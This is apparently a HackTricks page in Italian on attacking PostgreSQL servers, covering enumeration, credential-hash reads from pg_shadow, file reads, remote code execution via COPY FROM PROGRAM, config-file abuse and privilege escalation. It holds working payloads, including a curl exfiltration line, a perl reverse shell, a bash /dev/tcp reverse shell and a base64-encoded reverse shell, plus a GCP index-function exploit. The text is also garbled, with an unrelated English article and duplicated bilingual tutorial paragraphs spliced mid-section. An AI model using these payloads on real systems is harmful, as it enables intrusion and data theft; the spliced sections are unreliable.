# 5432,5433 - Pentesting Postgresql

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare facilmente e **automatizzare flussi di lavoro** supportati dagli strumenti della comunit√† pi√π avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## **Informazioni di base**

**PostgreSQL** √® descritto come un **sistema di database object-relational** che √® **open source**. Questo sistema non solo utilizza il linguaggio SQL, ma lo migliora anche con funzionalit√† aggiuntive. Le sue capacit√† gli consentono di gestire una vasta gamma di tipi di dati e operazioni, rendendolo una scelta versatile per sviluppatori e organizzazioni.

**Porta predefinita:** 5432, e se questa porta √® gi√† in uso sembra che postgresql utilizzer√† la porta successiva (probabilmente 5433) che non √® in uso.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Connessione e Enumerazione di Base

Per connettersi a un server PostgreSQL, √® possibile utilizzare il comando `psql` seguito dalle informazioni di connessione necessarie, come l'indirizzo IP del server, la porta e le credenziali di accesso.

```bash
psql -h <indirizzo_IP> -p <porta> -U <username> -W
```

Una volta connessi al server, √® possibile eseguire una serie di comandi per enumerare le informazioni di base sul database.

- Per visualizzare l'elenco dei database disponibili, utilizzare il comando `\l`.
- Per connettersi a un database specifico, utilizzare il comando `\c <nome_database>`.
- Per visualizzare l'elenco delle tabelle all'interno del database corrente, utilizzare il comando `\dt`.
- Per visualizzare lo schema di una tabella specifica, utilizzare il comando `\d <nome_tabella>`.
- Per eseguire una query SQL personalizzata, utilizzare il comando `<query_SQL>`.

√à importante notare che durante la fase di enumerazione, √® possibile raccogliere informazioni sensibili come nomi utente, password e dati sensibili dal database. Assicurarsi di utilizzare queste informazioni solo a fini legittimi e nel rispetto delle leggi applicabili.
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
Se eseguendo **`\list`** trovi un database chiamato **`rdsadmin`** sai di essere all'interno di un database **PostgreSQL AWS**.
{% endhint %}

Per ulteriori informazioni su **come sfruttare un database PostgreSQL** consulta:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Enumerazione Automatica
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Scansione delle porte**

Secondo [**questa ricerca**](https://www.exploit-db.com/papers/13084), quando un tentativo di connessione fallisce, `dblink` genera un'eccezione `sqlclient_unable_to_establish_sqlconnection` che include una spiegazione dell'errore. Di seguito sono elencati alcuni esempi di questi dettagli.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* Host non raggiungibile

`DETTAGLIO: impossibile connettersi al server: Nessun percorso per l'host. Il server √® in esecuzione sull'host "1.2.3.4" e accetta connessioni TCP/IP sulla porta 5678?`

* Porta chiusa
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* La porta √® aperta
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
# Pentesting PostgreSQL

## Introduction

PostgreSQL is an open-source relational database management system (RDBMS) that is widely used in web applications. As a pentester, it is important to understand how to assess the security of PostgreSQL installations and identify potential vulnerabilities.

## Enumeration

### Version Detection

To determine the version of PostgreSQL running on a target system, you can use the following methods:

- **Banner Grabbing**: Connect to the PostgreSQL service and analyze the banner message returned by the server. This message often includes the version information.

- **Default Port**: PostgreSQL typically runs on port 5432. By connecting to this port and analyzing the server response, you can often determine the version.

### User Enumeration

To enumerate the users in a PostgreSQL database, you can use the following techniques:

- **Brute Force**: Attempt to guess valid usernames by trying common names, default usernames, or usernames obtained from other sources.

- **Error Messages**: Some error messages returned by the server may reveal information about valid usernames. For example, an error message indicating that a user does not exist can be used to determine the existence of a user.

### Database Enumeration

To enumerate the databases in a PostgreSQL server, you can use the following methods:

- **Default Databases**: PostgreSQL typically includes default databases such as `postgres` and `template1`. By connecting to these databases and querying the system tables, you can obtain information about other databases.

- **Error-Based Enumeration**: Some error messages returned by the server may reveal information about existing databases. For example, an error message indicating that a database does not exist can be used to determine the existence of a database.

## Exploitation

### Default Credentials

PostgreSQL installations often have default credentials that are not changed by administrators. Some common default credentials include:

- **Username**: `postgres`
- **Password**: `postgres`

If these default credentials are not changed, an attacker can gain unauthorized access to the PostgreSQL server.

### SQL Injection

PostgreSQL is vulnerable to SQL injection attacks if user input is not properly sanitized. By injecting malicious SQL code, an attacker can manipulate the database and potentially gain unauthorized access.

### Privilege Escalation

If a user has been granted excessive privileges in a PostgreSQL database, an attacker can exploit this to escalate their own privileges. This can be done by abusing functions, exploiting misconfigurations, or leveraging vulnerabilities in the database server.

## Conclusion

Understanding the techniques and vulnerabilities associated with PostgreSQL is essential for pentesters. By effectively enumerating and exploiting these vulnerabilities, you can assess the security of PostgreSQL installations and help organizations improve their overall security posture.
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* La porta √® aperta o filtrata
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
Nelle funzioni PL/pgSQL, attualmente non √® possibile ottenere i dettagli delle eccezioni. Tuttavia, se si ha accesso diretto al server PostgreSQL, √® possibile recuperare le informazioni necessarie. Se non √® possibile estrarre nomi utente e password dalle tabelle di sistema, √® possibile considerare l'utilizzo del metodo di attacco wordlist discusso nella sezione precedente, in quanto potrebbe fornire risultati positivi.

## Enumerazione dei privilegi

### Ruoli

| Tipi di ruolo  |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Il ruolo ha privilegi di superutente                                                                                                                 |
| rolinherit     | Il ruolo eredita automaticamente i privilegi dei ruoli di cui √® membro                                                                                 |
| rolcreaterole  | Il ruolo pu√≤ creare altri ruoli                                                                                                                      |
| rolcreatedb    | Il ruolo pu√≤ creare database                                                                                                                         |
| rolcanlogin    | Il ruolo pu√≤ effettuare il login. In altre parole, questo ruolo pu√≤ essere utilizzato come identificatore di autorizzazione della sessione iniziale       |
| rolreplication | Il ruolo √® un ruolo di replica. Un ruolo di replica pu√≤ avviare connessioni di replica e creare ed eliminare slot di replica.                         |
| rolconnlimit   | Per i ruoli che possono effettuare il login, imposta il numero massimo di connessioni simultanee che questo ruolo pu√≤ effettuare. -1 significa nessun limite. |
| rolpassword    | Non la password (viene sempre visualizzata come `********`)                                                                                          |
| rolvaliduntil  | Ora di scadenza della password (utilizzata solo per l'autenticazione tramite password); null se non scade                                             |
| rolbypassrls   | Il ruolo ignora tutte le politiche di sicurezza a livello di riga, vedere [Sezione 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) per ulteriori informazioni. |
| rolconfig      | Impostazioni predefinite specifiche del ruolo per le variabili di configurazione in esecuzione                                                        |
| oid            | ID del ruolo                                                                                                                                         |

#### Gruppi interessanti

* Se si √® membri di **`pg_execute_server_program`** √® possibile **eseguire** programmi
* Se si √® membri di **`pg_read_server_files`** √® possibile **leggere** file
* Se si √® membri di **`pg_write_server_files`** √® possibile **scrivere** file

{% hint style="info" %}
Si noti che in Postgres un **utente**, un **gruppo** e un **ruolo** sono la **stessa cosa**. Dipende solo da **come lo si utilizza** e se si **permette il login**.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabelle

PostgreSQL organizes data into tables, which are composed of rows and columns. Each table has a name and a set of columns, which define the structure of the data stored in the table. 

PostgreSQL organizza i dati in tabelle, che sono composte da righe e colonne. Ogni tabella ha un nome e un insieme di colonne, che definiscono la struttura dei dati memorizzati nella tabella. 

#### Creating Tables

To create a table in PostgreSQL, you can use the `CREATE TABLE` statement followed by the table name and a list of column definitions. Each column definition includes the column name and the data type of the column.

Per creare una tabella in PostgreSQL, √® possibile utilizzare l'istruzione `CREATE TABLE` seguita dal nome della tabella e da un elenco di definizioni di colonne. Ogni definizione di colonna include il nome della colonna e il tipo di dati della colonna.

```sql
CREATE TABLE table_name (
    column1 datatype1,
    column2 datatype2,
    column3 datatype3,
    ...
);
```

#### Dropping Tables

To delete a table in PostgreSQL, you can use the `DROP TABLE` statement followed by the table name.

Per eliminare una tabella in PostgreSQL, √® possibile utilizzare l'istruzione `DROP TABLE` seguita dal nome della tabella.

```sql
DROP TABLE table_name;
```

#### Modifying Tables

PostgreSQL provides several commands to modify tables, such as adding or dropping columns, renaming columns, and changing column data types. Here are some examples:

PostgreSQL fornisce diversi comandi per modificare le tabelle, come l'aggiunta o la rimozione di colonne, la rinomina delle colonne e la modifica dei tipi di dati delle colonne. Ecco alcuni esempi:

##### Adding Columns

To add a new column to an existing table, you can use the `ALTER TABLE` statement followed by the table name and the `ADD COLUMN` clause.

Per aggiungere una nuova colonna a una tabella esistente, √® possibile utilizzare l'istruzione `ALTER TABLE` seguita dal nome della tabella e dalla clausola `ADD COLUMN`.

```sql
ALTER TABLE table_name
ADD COLUMN column_name datatype;
```

##### Dropping Columns

To drop a column from an existing table, you can use the `ALTER TABLE` statement followed by the table name and the `DROP COLUMN` clause.

Per eliminare una colonna da una tabella esistente, √® possibile utilizzare l'istruzione `ALTER TABLE` seguita dal nome della tabella e dalla clausola `DROP COLUMN`.

```sql
ALTER TABLE table_name
DROP COLUMN column_name;
```

##### Renaming Columns

To rename a column in an existing table, you can use the `ALTER TABLE` statement followed by the table name, the `RENAME COLUMN` clause, and the new column name.

Per rinominare una colonna in una tabella esistente, √® possibile utilizzare l'istruzione `ALTER TABLE` seguita dal nome della tabella, dalla clausola `RENAME COLUMN` e dal nuovo nome della colonna.

```sql
ALTER TABLE table_name
RENAME COLUMN old_column_name TO new_column_name;
```

##### Changing Column Data Types

To change the data type of a column in an existing table, you can use the `ALTER TABLE` statement followed by the table name, the `ALTER COLUMN` clause, and the new data type.

Per modificare il tipo di dati di una colonna in una tabella esistente, √® possibile utilizzare l'istruzione `ALTER TABLE` seguita dal nome della tabella, dalla clausola `ALTER COLUMN` e dal nuovo tipo di dati.

```sql
ALTER TABLE table_name
ALTER COLUMN column_name TYPE new_data_type;
```
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funzioni

Functions in PostgreSQL are named blocks of code that can be executed by calling their name. They are used to encapsulate a set of SQL statements and perform specific tasks. Functions can be created using the `CREATE FUNCTION` statement and can have input parameters and return values.

Le funzioni in PostgreSQL sono blocchi di codice con un nome che possono essere eseguiti chiamando il loro nome. Sono utilizzate per incapsulare un insieme di istruzioni SQL e svolgere compiti specifici. Le funzioni possono essere create utilizzando l'istruzione `CREATE FUNCTION` e possono avere parametri di input e valori di ritorno.
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Azioni sul file system

### Leggere directory e file

Da questo [**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) i membri del gruppo definito **`DEFAULT_ROLE_READ_SERVER_FILES`** (chiamato **`pg_read_server_files`**) e gli **super utenti** possono utilizzare il metodo **`COPY`** su qualsiasi percorso (controlla `convert_and_check_filename` in `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
Ricorda che se non sei un super utente ma hai i permessi **CREATEROLE**, puoi **aggiungerti come membro di quel gruppo**:
```sql
GRANT pg_read_server_files TO username;
```
[**Ulteriori informazioni.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Ci sono **altre funzioni di postgres** che possono essere utilizzate per **leggere file o elencare una directory**. Solo **superutenti** e **utenti con permessi espliciti** possono utilizzarle:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Puoi trovare **ulteriori funzioni** in [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Scrittura semplice di file

Solo gli **super utenti** e i membri di **`pg_write_server_files`** possono utilizzare la copia per scrivere file.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
Ricorda che se non sei un super utente ma hai i permessi **`CREATEROLE`**, puoi **aggiungerti come membro di quel gruppo:**
```sql
GRANT pg_write_server_files TO username;
```
[**Ulteriori informazioni.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Ricorda che COPY non pu√≤ gestire i caratteri di nuova riga, quindi anche se stai usando un payload in base64 **devi inviare un comando su una sola riga**.\
Una limitazione molto importante di questa tecnica √® che **`copy` non pu√≤ essere utilizzato per scrivere file binari in quanto modifica alcuni valori binari**.

### **Caricamento di file binari**

Tuttavia, ci sono **altre tecniche per caricare file binari di grandi dimensioni:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Suggerimento per bug bounty**: **iscriviti** a **Intigriti**, una piattaforma premium per bug bounty creata da hacker, per hacker! Unisciti a noi su [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) oggi stesso e inizia a guadagnare ricompense fino a **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **RCE al programma**

A partire dalla [versione 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), solo gli **super utenti** e i membri del gruppo **`pg_execute_server_program`** possono utilizzare copy per RCE (esempio con esfiltrazione:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Esempio di esecuzione:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
Ricorda che se non sei un super utente ma hai i permessi **`CREATEROLE`**, puoi **aggiungerti come membro di quel gruppo:**
```sql
GRANT pg_execute_server_program TO username;
```
[**Ulteriori informazioni.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Oppure utilizza il modulo `multi/postgres/postgres_copy_from_program_cmd_exec` di **metasploit**.\
Ulteriori informazioni su questa vulnerabilit√† [**qui**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Sebbene sia stato segnalato come CVE-2019-9193, Postges ha dichiarato che si tratta di una [funzionalit√† e non verr√† corretta](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE con i linguaggi di PostgreSQL

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE con le estensioni di PostgreSQL

Una volta che hai **imparato** dal post precedente **come caricare file binari**, puoi provare a ottenere **RCE caricando un'estensione di PostgreSQL e caricandola**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE con il file di configurazione di PostgreSQL

Il **file di configurazione** di PostgreSQL √® **scrivibile** dall'utente **postgres**, che √® quello che esegue il database, quindi come **superutente** puoi scrivere file nel filesystem e quindi puoi **sovrascrivere questo file**.

![](<../.gitbook/assets/image (303).png>)

#### **RCE con ssl\_passphrase\_command**

Ulteriori informazioni [su questa tecnica qui](https://pulsesecurity.co.nz/articles/postgres-sqli).

Il file di configurazione ha alcuni attributi interessanti che possono portare a RCE:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Percorso della chiave privata del database
* `ssl_passphrase_command = ''` Se il file privato √® protetto da password (criptato), PostgreSQL **eseguir√† il comando indicato in questo attributo**.
* `ssl_passphrase_command_supports_reload = off` **Se** questo attributo √® **on**, il **comando** eseguito se la chiave √® protetta da password **verr√† eseguito** quando viene **eseguito** `pg_reload_conf()`.

Quindi, un attaccante dovr√†:

1. **Estrarre la chiave privata** dal server
2. **Criptare** la chiave privata scaricata:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Sovrascrivere**
4. **Estrarre** la **configurazione** corrente di PostgreSQL
5. **Sovrascrivere** la **configurazione** con la configurazione degli attributi menzionati:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Eseguire `pg_reload_conf()`

Durante i test ho notato che ci√≤ funzioner√† solo se il **file della chiave privata ha i privilegi 640**, √® **di propriet√† di root** e del **gruppo ssl-cert o postgres** (in modo che l'utente postgres possa leggerlo) e si trova in _/var/lib/postgresql/12/main_.

#### **RCE con archive\_command**

**Ulteriori** [**informazioni su questa configurazione e su WAL qui**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Un altro attributo nel file di configurazione che pu√≤ essere sfruttato √® `archive_command`.

Per far funzionare questo, l'impostazione `archive_mode` deve essere `'on'` o `'always'`. Se ci√≤ √® vero, allora potremmo sovrascrivere il comando in `archive_command` e forzarlo ad eseguire tramite le operazioni di WAL (write-ahead logging).

I passaggi generali sono:

1. Verificare se la modalit√† di archiviazione √® abilitata: `SELECT current_setting('archive_mode')`
2. Sovrascrivere `archive_command` con il payload. Ad esempio, una reverse shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Ricaricare la configurazione: `SELECT pg_reload_conf()`
4. Forzare l'operazione WAL ad eseguire, che chiamer√† il comando di archiviazione: `SELECT pg_switch_wal()` o `SELECT pg_switch_xlog()` per alcune versioni di Postgres

## **Elevazione dei privilegi di Postgres**

### Elevazione dei privilegi CREATEROLE

#### **Grant**

Secondo la [**documentazione**](https://www.postgresql.org/docs/13/sql-grant.html): _I ruoli che hanno il privilegio **`CREATEROLE`** possono **concedere o revocare l'appartenenza a qualsiasi ruolo** che **non** √® un **superutente**._

Quindi, se hai il permesso **`CREATEROLE`**, puoi concederti l'accesso ad altri **ruoli** (che non sono superutenti) che possono darti la possibilit√† di leggere e scrivere file ed eseguire comandi:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modifica Password

Gli utenti con questo ruolo possono anche **modificare** le **password** di altri **non-superutenti**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc a SUPERUSER

√à abbastanza comune scoprire che **gli utenti locali possono accedere a PostgreSQL senza fornire alcuna password**. Pertanto, una volta ottenuti **i permessi per eseguire il codice**, √® possibile sfruttare tali permessi per ottenere il ruolo di **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Questo √® di solito possibile a causa delle seguenti righe nel file **`pg_hba.conf`**:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE privesc**

In [**questo articolo**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) viene spiegato come sia stato possibile effettuare una **privesc** in Postgres GCP sfruttando il privilegio ALTER TABLE concesso all'utente.

Quando si cerca di **assegnare la propriet√† di una tabella a un altro utente**, si dovrebbe ottenere un **errore** che lo impedisce, ma apparentemente GCP ha dato questa **opzione all'utente postgres non-superuser** in GCP:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Unendo questa idea al fatto che quando i comandi **INSERT/UPDATE/ANALYZE** vengono eseguiti su una **tabella con una funzione di indice**, la **funzione** viene **chiamata** come parte del comando con i **permessi del proprietario della tabella**. √à possibile creare un indice con una funzione e assegnare i permessi di proprietario a un **super user** su quella tabella, e quindi eseguire ANALYZE sulla tabella con la funzione malevola che sar√† in grado di eseguire comandi perch√© sta utilizzando i privilegi del proprietario.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Sfruttamento

1. Inizia creando una nuova tabella.
2. Inserisci del contenuto irrilevante nella tabella per fornire dati alla funzione di indice.
3. Sviluppa una funzione di indice malevola che contiene un payload di esecuzione del codice, consentendo l'esecuzione di comandi non autorizzati.
4. ALTERA il proprietario della tabella in "cloudsqladmin", che √® il ruolo superuser di GCP utilizzato esclusivamente da Cloud SQL per gestire e mantenere il database.
5. Esegui un'operazione ANALYZE sulla tabella. Questa azione costringe il motore PostgreSQL a passare al contesto utente del proprietario della tabella, "cloudsqladmin". Di conseguenza, la funzione di indice malevola viene chiamata con i permessi di "cloudsqladmin", consentendo l'esecuzione del comando shell precedentemente non autorizzato.

In PostgreSQL, questo flusso appare pi√π o meno cos√¨:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Quindi, la tabella `shell_commands_results` conterr√† l'output del codice eseguito:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Accesso Locale

Alcune istanze di postgresql mal configurate potrebbero consentire l'accesso di qualsiasi utente locale, √® possibile accedere localmente da 127.0.0.1 utilizzando la funzione **`dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Nota che per la query precedente funzioni **√® necessario che esista la funzione `dblink`**. Se non esiste, puoi provare a crearla con
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Se hai la password di un utente con privilegi superiori, ma all'utente non √® consentito effettuare il login da un IP esterno, puoi utilizzare la seguente funzione per eseguire query come tale utente:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
√à possibile verificare se questa funzione esiste con:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Funzione definita dall'utente con** SECURITY DEFINER

In [**questo articolo**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), i pentester sono riusciti ad ottenere privilegi elevati all'interno di un'istanza di postgres fornita da IBM, perch√© hanno **trovato questa funzione con il flag SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
‚Ä¶
</code></pre>

